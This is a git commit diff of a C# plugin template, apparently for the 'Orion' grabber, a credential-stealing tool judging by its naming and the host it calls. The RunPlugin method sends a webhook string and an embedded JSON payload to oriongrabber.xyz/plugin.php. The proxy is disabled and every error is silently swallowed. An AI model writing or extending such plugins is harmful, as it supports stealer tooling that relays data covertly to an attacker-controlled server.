bd7fdd494ea2cdc45940f8ab15fd0cd3e8a9b465
Orion <95526396+Orion-69@users.noreply.github.com>
2023-01-03 19:39:25 +0100

    Add files via upload
    Update

--- Plugin.cs
+++ Plugin.cs
@@ -1,23 +1,44 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Diagnostics;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.Collections.Specialized;
+using System.Net;
 
-//Dont change the name
+//Do not change the name
 namespace OrionPlugin
 {
     //Dont change the name
     public class Plugin
     {
-        //Dont change the name
-        //DO NOT add parameters (RunPlugin(object obj1)
-        public static void RunPlugin()
+        /// <summary>
+        /// The entry point of the plugin, do not change the method name.
+        /// Only parameter types of string, int and char are currently supported
+        /// If you want to use the SendWebhook method, add "string webhook" as the last parameter and it will pass itself automatically
+        /// </summary>
+        public static void RunPlugin(string webhook)
         {
-            //Add all the executing code here, for example:
-            //Method1();
-            //Class2.Method2();
+            SendToWebhook(webhook, Resource1.jsonPayload);
         }
+
+
+        /// <summary>
+        /// Allows you to send an embed to a webhook using a custom json payload.
+        /// Only pass the webhook parameter
+        /// </summary>
+        /// <param name="webhook">The webhook it will be sent to, pass it from the RunPlugin method parameter</param>
+        /// <param name="jsonPayload">Custom Json Payload to make the embed</param>
+        private static void SendToWebhook(string webhook, string jsonPayload)
+        {
+            
+            WebClient wc = new() { Proxy = null };
+            NameValueCollection nvc = new();
+            nvc.Add("webhook", webhook);
+            nvc.Add("payload", jsonPayload);
+            try
+            {
+                wc.UploadValues("https://oriongrabber.xyz/plugin.php", nvc);
+            }
+            catch
+            {
+            }
+        }
+
     }
 }
